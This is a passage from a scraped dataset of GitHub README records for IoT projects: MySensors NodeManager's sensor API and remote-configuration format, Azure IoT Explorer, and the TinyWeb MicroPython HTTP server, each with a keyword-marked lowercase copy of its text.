setduration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setstepduration(int value);\n//get instance of pca9685-board\nadafruit_pwmservodriver* getpwmservodriver();\n//set instance of pca9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setpwmservodriver(adafruit_pwmservodriver* servodriver);\n//set the rgb (red/green/blue) value as hex-string (e.g. 000000...black/off, ff0000...red, 00ff00...green, 0000ff...blue, ffa500...orange, ffffff...white)\nvoid setrgbval(string hexstring);\n//get the current rgb (red/green/blue) value as hex-string\nstring getrgbval();\nsensorpca9685rgbw\n// [101] set the effect to use for a smooth transition, can be one of sensordimmer::ease_linear (0), sensordimmer::ease_insine (1), sensordimmer::ease_outsine (2), sensordimmer::ease_inoutsine (3) (default: ease_linear)\nvoid seteasing(int value);\n// [102] the duration of entire the transition in seconds (default: 1)\nvoid setduration(int value);\n// [103] the duration of a single step of the transition in milliseconds (default: 100)\nvoid setstepduration(int value);\n//get instance of pca9685-board\nadafruit_pwmservodriver* getpwmservodriver();\n//set instance of pca9685-board, if using more than one pca9685-dimmer sensor on the same pca9685-board\nvoid setpwmservodriver(adafruit_pwmservodriver* servodriver);\n//set the rgbw (red/green/blue/white) value as hex-string (see rgb-examples from pca9685rgb and add \"00\"..\"ff\" for the white-channel)\nvoid setrgbwval(string hexstring);\n//get the current rgbw (red/green/blue/white) value as hex-string\nstring getrgbwval();\nsensordsm501a\n// [101] set the reference temperature for calculating pm1.0\nvoid settemperature(int value);\nsensorpn532\n// [101] wait for a valid card for the given amount of seconds. useful when battery powered (default: 0)\nvoid setwaitcardforseconds(int value);\n// return true if the card was recognized successfully, false otherwise. useful when a hook function needs to act upon the result\nbool getcardisvalid();\nsensorccs811\n// [101] set the temperature for calibrating the sensor\nvoid settemperature(float value);\n// set to true if the board has a temperature sensor embedded that can be used for calibration (default: false)\nvoid settemperaturesensor(bool value);\nsensormpr121\n// set the passcode length. passcode will be sent to the controller only after this number of digits have been pressed (default: 4)\nvoid setpasscodelength(int value);\n// [101] wait for a valid code for the given amount of seconds. useful when battery powered (default: 0)\nvoid setwaitcodeforseconds(int value);\n// return true if the code was recognized successfully, false otherwise. useful when a hook function needs to act upon the result\nbool getcodeisvalid();\nsensorgsm\n// set the baud rate of the serial port for connecting to the sensor (default: 115200)\nvoid setbaudrate(uint32_t value);\n// [101] set the recipient phone number\nvoid setrecipient(const char* value);\n// send the provided text via sms to the configured recipient\nvoid sendsms(const char* text);\nota configuration\nwhen nodemanager_ota_configuration is set to on the api presented above can be also called remotely through sensorconfiguration, which is automatically added to nodemanager. sensorconfiguration exposes by default child id 200 that can be used to interact with the service by sending v_custom type of messages and commands within the payload. for each req message, the node will respond with a set message if successful.\nalmost all the functions made available through the api can be called remotely. to do so, the payload must be in the format <child_id>,<function_id>[,<value_to_set>] where child_id is the recipient child id you want to communicate with (the node has child id 0), function_id is the number between square brackets you can find in the api documentation and, if the function takes and argument, this can be passed along in value_to_set. for example, to change the sleep time to e.g. 10 minutes:\n// [4] set the duration (in minutes) of a sleep cycle\nvoid setsleepminutes(unsigned long value);\n<node_id>;<configuration_child_id>;<req>;0;<v_custom>;<child_id>,<function_id>,<value> 100;200;2;0;48;0,4,10\nto wake up a node previously configured as sleeping, send the following as the node wakes up next:\n// [9] wake up the board\nvoid wakeup();\n100;200;2;0;48;0,9\nif you want to collect and average 10 samples for the sensor on child_id 1:\n// [5] for some sensors, the measurement can be queried multiple times and an average is returned (default: 1)\nvoid setsamples(unsigned int value);\n100;200;2;0;48;1,5,10\nif you want to decrease the temperature offset of a thermistor sensor to -2:\n// [105] set a temperature offset\nvoid setoffset(float value);\n100;200;2;0;48;1,105,-2\nplease note that anything set remotely will not persist a reboot apart from the sleep interval which is saved to the eeprom if setsavesleepsettings() is set.\nhow it works\nyour sketch should begin with the standard mysensors directives\nnodemanager's settings can be customized through nodemanager_* defines, just after. if not set, the default value will be used\nto make use of the nodemanager library you have to include it with #include <mysensors_nodemanager.h>. this automatically includes the required mysensors libraries and creates an object called nodemanager\nto add a sensor, just include the corresponding header file and creates an instance of the class\ninteraction with your code happens through callback functions, placed at the end of before(), presentation(), loop(), receive() and receivetimes().\nthe following is detailed what happens when the different callback functions are called:\nnodemanager::before():\nsetup the interrupt pins to wake up the board based on the configured interrupts\nrestore from the eeprom the latest sleeping settings, if setsavesleepsettings() was set\ncreate and register an instance of sensorconfiguration\nnodemanager::presentation():\npresent the sketch\npresent each child of each of each registered sensors\nnodemanager::setup():\nsync the time with the controller (if requested)\nsetup the sd card reader (if requested)\ncall setup() of each registered sensor\nsetup the interrupts as requested by the sensors\nsensor::setup():\ninitialize the timers\ncall the sensor-specific implementation of setup by invoking onsetup()\nnodemanager::loop():\nsync the time with the controller if not done recently\nif all the sensors are powered by a pin, this is turned on\ncall loop() of each of the registered sensor\nif all the sensors are powered by a pin, this is turned off\ngo to sleep (if requested)\nsensor::loop():\nif it is time to take a new measure he sensor-specific onloop() is called. if multiple samples are requested, this is run multiple times. onloop() is not intended to send out any message but just sets a new value to the requested child\nif it is time to report, a message is sent to the gateway with the value. depending on the configuration, this is not sent if it is the same as the previous value or sent anyway after a given number of cycles. these functionalities are not sensor-specific and common to all the sensors inheriting from the sensor class.\nnodemanager::receive():\nreceive a message from the radio network\ndispatch the message to the recipient sensor\nsensor::receive():\ninvoke sensor::loop() which will execute the sensor main task and eventually call sensor::onreceive()\nsensor::interrupt():\ncheck if the value from the interrupt is matching the one expected\ncalls the sensor's implementation of oninterrupt() to handle the interrupt\neach sensor is in dedicated header file under the sensors directory of the library which has be directly included if needed into the main sketch. the implementation of the class is inline. required libraries and ota configuration request handling is everything happening inside the class.\ncontributing\ncontributes to nodemanager are of course more than welcome.\nreporting an issue or request an enhancement\nfor reporting an issue, requesting support for a new sensor or any other kind of enhancement, please drop a message either on the project's main page (https://www.mysensors.org/download/node-manager), on the mysensors forum (https://forum.mysensors.org/category/43/nodemanager) or open an issue directly on github (https://github.com/mysensors/nodemanager/issues).\ncontributing to the code\nif you want to contribute to the code, a pull request on github is the way to go. first of all setup your development environment:\ncreate a copy of the project in your github account by clicking on the \"fork\" button on https://github.com/mysensors/nodemanager\ncheck the copy actually exists on https://github.com/<username>/nodemanager\nclone your repository on your computer: git clone https://github.com/<username>/nodemanager.git\nconfigure the main project's repository as an upstream: git remote add upstream https://github.com/mysensors/nodemanager.git\ncreate and switch to a local development branch: git checkout -b development origin/development\nbefore applying any change, always ensure you have the latest development version available:\nswitch to your local development branch: git checkout development\nfetch the latest version from the main project's repository: git fetch upstream\nmerge into your development copy all the changes from the main repository: git merge development upstream/development\nupdate the development branch of your repository: git push origin development\ncreate a branch for the fix/feature you want to work on and apply changes to the code:\ncreate and switch to a new branch (give it a significant name, e.g. fix/enum_sensors): git checkout -b <yourbranch>\ndo any required change to the code\ninclude all the files changed for your commit: git add .\ncommit the changes: git commit -m\"use enum instead of define for defining each sensor #121\"\npush the branch with the changes to your repository: git push origin <yourbranch>\nvisit https://github.com/<username>/nodemanager/branches and click the \"new pull request\" button just aside your newly created branch\nfill in the request with a significant title and description and select the \"development\" branch (this step is very important)\nsubmit the request and start the discussion. after a few seconds, the configured continuous integration -----> tool !!!  will automatically compile your code and check for errors\nany additional commits to your branch which will be presented within the same pull request\nwhen the pull request is merged, feel free delete your local branch: git branch -d <yourbranch>\nupdate your local and remote development branch as per the instructions above\nif there are changes introduced to the development branch that conflicts with an open pull request, you will have to resolve the conflicts and update the pr:\nfetch and merge into development any change from upstream/development as detailed above\nswitch to your branch: git checkout <yourbranch>\nrebase the branch you filed the pr from against your updated development branch: git rebase development\nresolve the conflicts and commit again\nforce push your updated branch so the pr gets updated: git push head:<yourbranch> -f\ncontributing with a new sensor\nwhen contributing with a new sensor follows the same guidelines presented above and proceed with the following steps:\ndefine your class is in a header file named sensorname_of_the_sensor.h under the sensors directory\nimplement your sensor inline with the class. see sensorexample.h or other sensors for more commented examples and details\nadd your sensor in examples/templates/template.ino, just after the last sensor\nadd an additional job in the travis ci configuration file .travis.yml\nadd the sensor's specs in \"add your sensors\" and in \"built-in sensors api\" of the readme.md file\nadd the name of the class of your sensor in the keywords.txt file\ncompatibility\nthis version of nodemanager has been tested and is compatible with the following mysensors library:\nv2.3.0\nv2.2.0\nv2.1.1\nyou don't necessarily need a nodemanager gateway to interact with a nodemanager node. a nodemanager node is fully compatible with any existing gateway you are currently operating with.\nthere are generally speaking no compatibility issues in having in your network nodes running different versions of nodemanager.\nstarting from v1.8 nodemanager is released as an arduino library hence your code has to be migrated manually from previous versions.\nrelease notes\nv1.0:\ninitial release\nv1.1:\nadded ability to sleep between send() so to save additional battery\nbug fixes\nv1.2:\nadded out-of-the-box support for bh1750 light sensor\nadded out-of-the-box support for htu21d temperature and humidity sensor\nadded out-of-the-box support for mlx90614 contactless temperature sensor\nadded a few examples to the documentation\nfixed a few bugs\nv1.3:\nadded support for bme280 temperature/humudity/pressure sensor\nadded option to measure battery level via a pin in addition to internal vcc\nadded example sketches to the documentation\nfixed a few bugs\nv1.4:\nadded support for ml8511 uv intensity sensor\nadded support for mq air quality sensor\nadded ability to manually assign a child id to a sensor\nensured compatibility for non-sleeping nodes\nability to control if waking up from an interrupt counts for a battery level report\nwhen power pins are set the sensor is powered on just after\nservice messages are disabled by default\nbug fixes\nv1.5:\nadded support for acs712 current sensor\nadded support for hc-sr04 distance sensor\nadded support for bmp085/bmp180 temperature and pressure sensor\nadded support for sonoff smart switch\nadded support for rain gauge sensor\nadded support for mcp9808 temperature sensor\nadded forecast output to all bosch sensors\nadded i2c address auto-discovery for all bosch sensors\nadded support for running as a gateway\nadded option to retrieve the latest value of a sensor from outside nodemanager\nremote reboot now does not need a reboot pin configured\na heartbeat is now sent also when waking up from a wait cycle\nwhen waking up for an interrupt, only the code of the sensor expecting that interrupt is executed\nadded capability to retrieve the time from the controller\noptimized battery life for ds18b20 sensors\nsleep_manager has been deprecated (now always enabled) and setmode() replaces setsleepmode()\nnew mode always_on to let the node staying awake and executing each sensors' loop\nesp8266wifi.h has to be included in the main sketch if my_gateway_esp8266 is defined\nadded receivetime() wrapper in the main sketch\nfixed the logic for output sensors\nadded common gateway settings in config.h\nv1.6:\nintroduced new remote api to allow calling almost all nodemanager's and its sensors' functions remotely\nreporting interval configuration is now indipendent from the sleep cycle\nreporting interval can be customized per-sensor\nall intervals (measure/battery reports) are now time-based\nadded support for bmp280 temperature and pressure sensor\nadded support for rs485 serial transport\nadded support for tsl2561 light sensor\nadded support for dht21 temperature/humidity sensor\nadded support for am2320 temperature/humidity sensor\nadded support for pt100 high temperature sensor\nadded support for mh-z19 co2 sensor\nadded support for analog rain and soil moisture sensors\nadded support for generic dimmer sensor (pwm output)\nadded support for power and water meter pulse sensors\nradio signal level (rssi) is now reported automatically like the battery level\nsensorraingauge now supports sleep mode\nsensorswitch now supports awake mode\nsensorlatchingrealy now handles automatically both on and off commands\nsensormq now depends on its own module\nadded safeguard (automatic off) to sensordigitaloutput\nany sensor can now access all nodemanager's functions\ndht sensor now using mysensors' dht library\nv1.7:\nreviewed the entire nodemanager's architecture with children now automatically created from within each sensor\noptimized the code so to use the memory in a more efficient manner\nimproved the overall user experience, also with sensors' patterns in the main sketch\nsensors can now be enabled by uncommenting the corresponding use_* define and requiring a single line to be created and initialized\nnodemanager's advanced features can be enabled/disabled by setting the corresponding nodemanager_* define\nsimplified the configuration of each sensor, now without the need of getting the sensor back through a nasty casting\nmerged config.h into the main sketch so to centralize the configuration in a single place\nadded time-aware capability, with or without an attached rtc\nintra-sensor communication now possible with the possibility for the user to nicely hook into the sensor's code\nbatery and signal reports are now available through the regular sensors sensorbattery and sensorsignal\nremote api interaction for all the sensors has been moved into the regular sensor sensorconfiguration\nfixed bug preventing negative temperatures to be reported for all the sensors\nadded ability for each sensor to report only when value is above or below a configured threshold\naddded support for sd card reader\nadded support for rfm95 radio\nadded supoport for mysensors sensebender gateway and sensebender micro boards\nadded support for generic lcd devices through an abstract display class\nsensordimmer now supports both v_status and v_percentage\nsensorpulsemeter now supports running on batteries\nsensords18b20 optimized and now supporting v_id\nsensorswitch (now renamed into sensorinterrupt) now catches interrupt in a more reliable way\nsensorlatchingrelay now specialized and renamed into sensorlatchingrelay1pin and sensorlatchingrelay2pins\nadded support for hd44780 i2c lcd\nadded support for mg996r servo sensor\nadded support for vl53l0x laser time-of-flight distance sensor\nadded support for sensorplantowerpms particulate matter sensors\nadded support for sht31 temperature and humidity sensor\nadded support for si7021 temperature and humidity sensor\nadded support for for neopixel led\nadded support for chirp sensor soil moisture sensor\nadded support for sparkfun rgb and gesture sensor\nadded support for ttp226/ttp229 touch control sensor\nv1.8:\nsplit nodemanager's core classes in individual files and each sensor code in its own dedicated header file\nnew arduino-compatible library structure to allow easier integration and more consistent updates across version\nincluded a complete set of examples which can be loaded directly from the arduino ide\nsimplified the template sketch with a global nodemanager object and sensors that can be imported directly from there\ndebug output is now fully compatible with the one used by the mysensors library and integrated into mysensors logparser\nbetter control on how often, if and when to sync the time with the controller for time-aware nodes\nadded a measure timer so to allow splitting between taking measures and reporting\nadded support for every sensor to keep track of the last value assigned to a child in eeprom and restoring it upon a reboot\nintroduced new capabilities for reporting every minute/hour/day or only at a given minute/hour/day\nadded ability to read from the serial port at the end of each loop cycle, useful for debugging interactive sensors\nadded support for ph sensor\nadded support for pca9685 as rgb/rgbw/w dimmer\nadded support for dsm501a dust sensor\nadded support for pn532 nfc rfid module\nadded support for ccs811 co2/voc sensor\nadded support for mpr121 capacitive touch sensor\nadded support for serial gsm/sms device\nadded support for fpm10a fingerprint sensor\nadded support for sds011 air quality sensor\nadded support for esp32 devices\nadded support for nrf52 radio\nimproved sensordigitalinput and neopixelsensor\nsi7021 sensor is now using the library from the mysensors example\nreviewed the mq sensor implementation\noptimized memory utilization\nadded travis continuous integration tests\nfixed wrong battery report when using battery pin and sensorrain/sensorsoilmoisture\nfixed digitaloutput safeguard not working as expected\nfixed radio signal level reporting wrong values\nfixed sensorlatchingrelay2pins wrong pin selection\nother minor bug fixes", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000470, "year": null}, {"Unnamed: 0": 471, "autor": 471, "date": null, "content": "Azure IoT Explorer (preview)\nCI Pipeline\nRelease Pipeline\nTable of Contents\nGetting Azure IoT Explorer\nFeatures\nContributing\nGetting Azure IoT Explorer\nYou can either download a pre-built version or build it yourself.\nDownload a pre-built version\nGo to the Releases tab, download the installer corresponding to your platform and install.\nInstall via Chocolatey\nChocolatey is a means to deploy and configure software for Windows operating systems via scripting.\nAfter installing Chocolatey, run choco install azure-iot-explorer --pre.\nRun it locally and build it yourself\nOpen a Node capable command prompt\nClone the repo: git clone https://github.com/Azure/azure-iot-explorer.git\nRun: npm install\nRun: npm start\nA new tab in your default browser will be opened automatically pointing to the locally running site.\n[optional] Stop step 4 then run: npm run build and then run: npm run electron.\nThe electron app will spin up using the bits generated in the dist folder.\nIf you'd like to package the app yourself, please refer to the FAQ.\nFeatures\nConfigure an IoT Hub connection\nUpon opening the application, add the connection string of your IoT hub. You can add multiple strings, view, update or delete them anytime by returning to Home.\nDevice CRUD\nClick New to create a new device.\nSelect device(s) and click Delete to delete device(s). Multiple devices can be selected by clicking while dragging the mouse.\nDevices can by queried by typing the first few characters of a device name in the query box.\nDevice functionalities\nClick on the device name to see the device details and interact with the device.\nCheck out the list of features that we support\nPlug and Play\nIf you are looking for a UI tool to get a flavor of Plug and Play, look no futher. Follow this Microsoft Docs to get started.\nOnce your device has gone through discovery, IoT Plug and Play components page would be available on device details view.\nThe model ID would be shown.\nFollow our guidance to set up how we can retrieve model definitions. If it is already setup, We will inform you where are we resolving your model definitions from.\nA table would show the list of components implemented by the device and the corresponding interfaces the components conform to.\nYou can go back to Home (either from device or by directly clicking the breadcrumb) to change how we resolve model definitions. Note this is a global setting which would affect across the hub.\nClick the name of any component, and switch between interface, properties, commands and telemetry to start interacting with the PnP device.\nContributing\nThis project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.\nWhen you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.\nThis project has adopted the Microsoft Open Source Code of Conduct. For more information see the Code of Conduct FAQ or contact opencode@microsoft.com with any additional questions or comments.", "link": "https://github.com/Azure/azure-iot-explorer", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "azure iot explorer (preview)\nci pipeline\nrelease pipeline\ntable of contents\ngetting azure iot explorer\nfeatures\ncontributing\ngetting azure iot explorer\nyou can either download a pre-built version or build it yourself.\ndownload a pre-built version\ngo to the releases tab, download the installer corresponding to your platform and install.\ninstall via chocolatey\nchocolatey is a means to deploy and configure software for windows operating systems via scripting.\nafter installing chocolatey, run choco install azure-iot-explorer --pre.\nrun it locally and build it yourself\nopen a node capable command prompt\nclone the repo: git clone https://github.com/azure/azure-iot-explorer.git\nrun: npm install\nrun: npm start\na new tab in your default browser will be opened automatically pointing to the locally running site.\n[optional] stop step 4 then run: npm run build and then run: npm run electron.\nthe electron app will spin up using the bits generated in the dist folder.\nif you'd like to package the app yourself, please refer to the faq.\nfeatures\nconfigure an iot hub connection\nupon opening the application, add the connection string of your iot hub. you can add multiple strings, view, update or delete them anytime by returning to home.\ndevice crud\nclick new to create a new device.\nselect device(s) and click delete to delete device(s). multiple devices can be selected by clicking while dragging the mouse.\ndevices can by queried by typing the first few characters of a device name in the query box.\ndevice functionalities\nclick on the device name to see the device details and interact with the device.\ncheck out the list of features that we support\nplug and play\nif you are looking for a ui -----> tool !!!  to get a flavor of plug and play, look no futher. follow this microsoft docs to get started.\nonce your device has gone through discovery, iot plug and play components page would be available on device details view.\nthe model id would be shown.\nfollow our guidance to set up how we can retrieve model definitions. if it is already setup, we will inform you where are we resolving your model definitions from.\na table would show the list of components implemented by the device and the corresponding interfaces the components conform to.\nyou can go back to home (either from device or by directly clicking the breadcrumb) to change how we resolve model definitions. note this is a global setting which would affect across the hub.\nclick the name of any component, and switch between interface, properties, commands and telemetry to start interacting with the pnp device.\ncontributing\nthis project welcomes contributions and suggestions. most contributions require you to agree to a contributor license agreement (cla) declaring that you have the right to, and actually do, grant us the rights to use your contribution. for details, visit https://cla.opensource.microsoft.com.\nwhen you submit a pull request, a cla bot will automatically determine whether you need to provide a cla and decorate the pr appropriately (e.g., status check, comment). simply follow the instructions provided by the bot. you will only need to do this once across all repos using our cla.\nthis project has adopted the microsoft open source code of conduct. for more information see the code of conduct faq or contact opencode@microsoft.com with any additional questions or comments.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000471, "year": null}, {"Unnamed: 0": 472, "autor": 472, "date": null, "content": "TinyWeb\nSimple and lightweight (thus - tiny) HTTP server for tiny devices like ESP8266 / ESP32 running micropython. Having simple HTTP server allows developers to create nice and modern UI for their IoT devices. By itself - tinyweb is just simple TCP server running on top of uasyncio - library for micropython, therefore tinyweb is single threaded server.\nFeatures\nFully asynchronous when using with uasyncio library for MicroPython.\nFlask / Flask-RESTful like API.\nTiny memory usage. So you can run it on devices like ESP8266 / ESP32 with 64K/96K of onboard RAM. BTW, there is a huge room for optimizations - so your contributions are warmly welcomed.\nSupport for static content serving from filesystem.\nGreat unittest coverage. So you can be confident about quality :)\nRequirements\nlogging\nOn MicroPython <1.13:\nuasyncio - micropython version of async python library.\nuasyncio-core\nQuickstart\nThe easist way to try it - is using pre-compiled firmware for ESP8266 / ESP32. Instructions below are tested with NodeMCU devices. For any other devices instructions could be a bit different, so keep in mind. CAUTION: If you proceed with installation all data on your device will lost!\nInstallation - ESP8266\nDownload latest firmware_esp8266-version.bin from releases.\nInstall esp-tool if you haven't done already: pip install esptool\nErase flash: esptool.py --port <UART PORT> --baud 256000 erase_flash\nFlash firmware: esptool.py --port <UART PORT> --baud 256000 write_flash -fm dio 0 firmware_esp8266-v1.3.2.bin\nInstallation - ESP32\nDownload latest firmware_esp32-version.bin from releases.\nInstall esp-tool if you haven't done already: pip install esptool\nErase flash: esptool.py --port <UART PORT> --baud 256000 erase_flash\nFlash firmware: esptool.py --port <UART PORT> --baud 256000 write_flash -fm dio 0x1000 firmware_esp32-v1.3.2.bin\nHello world\nLet's develop Hello World web app:\nimport tinyweb\n# Create web server application\napp = tinyweb.webserver()\n# Index page\n@app.route('/')\nasync def index(request, response):\n# Start HTTP response with content-type text/html\nawait response.start_html()\n# Send actual HTML page\nawait response.send('<html><body><h1>Hello, world! (<a href=\"/table\">table</a>)</h1></html>\\n')\n# Another one, more complicated page\n@app.route('/table')\nasync def table(request, response):\n# Start HTTP response with content-type text/html\nawait response.start_html()\nawait response.send('<html><body><h1>Simple table</h1>'\n'<table border=1 width=400>'\n'<tr><td>Name</td><td>Some Value</td></tr>')\nfor i in range(10):\nawait response.send('<tr><td>Name{}</td><td>Value{}</td></tr>'.format(i, i))\nawait response.send('</table>'\n'</html>')\ndef run():\napp.run(host='0.0.0.0', port=8081)\nSimple? Let's try it! Flash your device with firmware, open REPL and type:\n>>> import network\n# Connect to WiFi\n>>> sta_if = network.WLAN(network.STA_IF)\n>>> sta_if.active(True)\n>>> sta_if.connect('<ssid>', '<password>')\n# Run Hello World! :)\n>>> import examples.hello_world as hello\n>>> hello.run()\nThat's it! :) Try it by open page http://<your ip>:8081\nLike it? Check more examples then :)\nLimitations\nHTTP protocol support - due to memory constrains only HTTP/1.0 is supported (with exception for REST API - it uses HTTP/1.1 with Connection: close). Support of HTTP/1.1 may be added when esp8266 platform will be completely deprecated.\nReference\nclass webserver\nMain tinyweb app class.\n__init__(self, request_timeout=3, max_concurrency=None) - Create instance of webserver class.\nrequest_timeout - Specifies timeout for client to send complete HTTP request (without HTTP body, if any), after that connection will be closed. Since uasyncio has very short queue (about 42 items) Avoid using values > 5 to prevent events queue overflow.\nmax_concurrency - How many connections can be processed concurrently. It is very important to limit it mostly because of memory constrain. Default value depends on platform, 3 for esp8266, 6 for esp32 and 10 for others.\nbacklog - Parameter to socket.listen() function. Defines size of pending to be accepted connections queue. Must be greater than max_concurrency.\ndebug - Whether send exception info (text + backtrace) to client together with HTTP 500 or not.\nadd_route(self, url, f, **kwargs) - Map url into function f. Additional keyword arguments are supported:\nmethods - List of allowed methods. Defaults to ['GET', 'POST']\nsave_headers - Due to memory constrains you most likely want to minimze memory usage by saving only headers which you really need in. E.g. for POST requests it is make sense to save at least 'Content-Length' header. Defaults to empty list - [].\nmax_body_size - Max HTTP body size (e.g. POST form data). Be careful with large forms due to memory constrains (especially with esp8266 which has 64K RAM). Defaults to 1024.\nallowed_access_control_headers - Whenever you're using xmlHttpRequest (send JSON from browser) these headers are required to do access control. Defaults to *\nallowed_access_control_origins - The same idea as for header above. Defaults to *.\n@route - simple and useful decorator (inspired by Flask). Instead of using add_route() directly - just decorate your function with @route, like this:\n@app.route('/index.html')\nasync def index(req, resp):\nawait resp.send_file('static/index.simple.html')\nadd_resource(self, cls, url, **kwargs) - RestAPI: Map resource class cls to url. Class cls is arbitrary class with with implementation of HTTP methods:\nclass CustomersList():\ndef get(self, data):\n\"\"\"Return list of all customers\"\"\"\nreturn {'1': {'name': 'Jack'}, '2': {'name': 'Bob'}}\ndef post(self, data):\n\"\"\"Add customer\"\"\"\ndb[str(next_id)] = data\nreturn {'message': 'created'}, 201\n**kwargs are optional and will be passed to handler directly. Note: only GET, POST, PUT and DELETE methods are supported. Check restapi full example as well.\n@resource - the same idea as for route but for resource:\n# Regular version\n@app.resource('/user/<id>')\ndef user(data, id):\nreturn {'id': id, 'name': 'foo'}\n# Generator based / different HTTP method\n@app.resource('/user/<id>', method='POST')\nasync def user(data, id):\nyield '{'\nyield '\"id\": \"{}\",'.format(id)\nyield '\"name\": \"test\",'\nyield '}'\nrun(self, host=\"127.0.0.1\", port=8081, loop_forever=True, backlog=10) - run web server. Since tinyweb is fully async server by default it is blocking call assuming that you've added other tasks before.\nhost - host to listen on\nport - port to listen on\nloop_forever - run async.loop_forever(). Set to False if you don't want run to be blocking call. Be sure to call async.loop_forever() by yourself.\nbacklog - size of pending connections queue (basically argument to listen() function)\nshutdown(self) - gracefully shutdown web server. Meaning close all active connections / server socket and cancel all started coroutines. NOTE be sure to it in event loop or run event loop at least once, like:\nasync def all_shutdown():\nawait asyncio.sleep_ms(100)\ntry:\nweb = tinyweb.webserver()\nweb.run()\nexcept KeyboardInterrupt as e:\nprint(' CTRL+C pressed - terminating...')\nweb.shutdown()\nuasyncio.get_event_loop().run_until_complete(all_shutdown())\nclass request\nThis class contains everything about HTTP request. Use it to get HTTP headers / query string / etc. Warning - to improve memory / CPU usage strings in request class are binary strings. This means that you must use b prefix when accessing items, e.g.\n>>> print(req.method)\nb'GET'\nSo be sure to check twice your code which interacts with request class.\nmethod - HTTP request method.\npath - URL path.\nquery_string - URL path.\nheaders - dict of saved HTTP headers from request. **Only if enabled by save_headers.\nif b'Content-Length' in self.headers:\nprint(self.headers[b'Content-Length'])\nread_parse_form_data() - By default (again, to save CPU/memory) tinyweb doesn't read form data. You have to call it manually unless you're using RESTApi. Returns dict of key / value pairs.\nclass response\nUse this class to generate HTTP response. Please be noticed that response class is using regular strings, not binary strings as request class does.\ncode - HTTP response code. By default set to 200 which means OK, no error.\nversion - HTTP version. Defaults to 1.0. Please be note - that only HTTP1.0 is internally supported by tinyweb. So if you changing it to 1.1 - be sure to support protocol by yourself.\nheaders - HTTP response headers dictionary (key / value pairs).\nadd_header(self, key, value) - Convenient way to add HTTP response header\nkey - Header name\nvalue - Header value\nadd_access_control_headers(self) - Add HTTP headers required for RESTAPI (JSON query)\nredirect(self, location) - Generate HTTP redirection (HTTP 302 Found) to location. This function is coroutine.\nstart_html(self)- Start response with HTML content type. This function is coroutine. This function is basically sends response line and headers. Refer to hello world example.\nsend(self, payload) - Sends your string/bytes payload to client. Be sure to start your response with start_html() or manually. This function is coroutine.\nsend_file(self, filename): Send local file as HTTP response. File type will be detected automatically unless you explicitly change it. If file doesn't exists - HTTP Error 404 will be generated. Additional keyword arguments\ncontent_type - MIME filetype. By default - None which means autodetect.\ncontent_encoding - Specifies used compression type, e.g. gzip. By default - None which means don't add this header.\nmax_age - Cache control. How long browser can keep this file on disk. Value is in seconds. By default - 30 days. To disable caching, set it to 0.\nerror(self, code) - Generate HTTP error response with error code. This function is coroutine.", "link": "https://github.com/belyalov/tinyweb", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tinyweb\nsimple and lightweight (thus - tiny) http server for tiny devices like esp8266 / esp32 running micropython. having simple http server allows developers to create nice and modern ui for their iot devices. by itself - tinyweb is just simple tcp server running on top of uasyncio - library for micropython, therefore tinyweb is single threaded server.\nfeatures\nfully asynchronous when using with uasyncio library for micropython.\nflask / flask-restful like api.\ntiny memory usage. so you can run it on devices like esp8266 / esp32 with 64k/96k of onboard ram. btw, there is a huge room for optimizations - so your contributions are warmly welcomed.\nsupport for static content serving from filesystem.\ngreat unittest coverage. so you can be confident about quality :)\nrequirements\nlogging\non micropython <1.13:\nuasyncio - micropython version of async python library.\nuasyncio-core\nquickstart\nthe easist way to try it - is using pre-compiled firmware for esp8266 / esp32. instructions below are tested with nodemcu devices. for any other devices instructions could be a bit different, so keep in mind. caution: if you proceed with installation all data on your device will lost!\ninstallation - esp8266\ndownload latest firmware_esp8266-version.bin from releases.\ninstall esp------> tool !!!  if you haven't done already: pip install esptool\nerase flash: esptool.py --port <uart port> --baud 256000 erase_flash\nflash firmware: esptool.py --port <uart port> --baud 256000 write_flash -fm dio 0 firmware_esp8266-v1.3.2.bin\ninstallation - esp32\ndownload latest firmware_esp32-version.bin from releases.\ninstall esp------> tool !!!  if you haven't done already: pip install esptool\nerase flash: esptool.py --port <uart port> --baud 256000 erase_flash\nflash firmware: esptool.py --port <uart port> --baud 256000 write_flash -fm dio 0x1000 firmware_esp32-v1.3.2.bin\nhello world\nlet's develop hello world web app:\nimport tinyweb\n# create web server application\napp = tinyweb.webserver()\n# index page\n@app.route('/')\nasync def index(request, response):\n# start http response with content-type text/html\nawait response.start_html()\n# send actual html page\nawait response.send('<html><body><h1>hello, world! (<a href=\"/table\">table</a>)</h1></html>\\n')\n# another one, more complicated page\n@app.route('/table')\nasync def table(request, response):\n# start http response with content-type text/html\nawait response.start_html()\nawait response.send('<html><body><h1>simple table</h1>'\n'<table border=1 width=400>'\n'<tr><td>name</td><td>some value</td></tr>')\nfor i in range(10):\nawait response.send('<tr><td>name{}</td><td>value{}</td></tr>'.format(i, i))\nawait response.send('</table>'\n'</html>')\ndef run():\napp.run(host='0.0.0.0', port=8081)\nsimple? let's try it! flash your device with firmware, open repl and type:\n>>> import network\n# connect to wifi\n>>> sta_if = network.wlan(network.sta_if)\n>>> sta_if.active(true)\n>>> sta_if.connect('<ssid>', '<password>')\n# run hello world! :)\n>>> import examples.hello_world as hello\n>>> hello.run()\nthat's it! :) try it by open page http://<your ip>:8081\nlike it? check more examples then :)\nlimitations\nhttp protocol support - due to memory constrains only http/1.0 is supported (with exception for rest api - it uses http/1.1 with connection: close). support of http/1.1 may be added when esp8266 platform will be completely deprecated.\nreference\nclass webserver\nmain tinyweb app class.\n__init__(self, request_timeout=3, max_concurrency=none) - create instance of webserver class.\nrequest_timeout - specifies timeout for client to send complete http request (without http body, if any), after that connection will be closed. since uasyncio has very short queue (about 42 items) avoid using values > 5 to prevent events queue overflow.\nmax_concurrency - how many connections can be processed concurrently. it 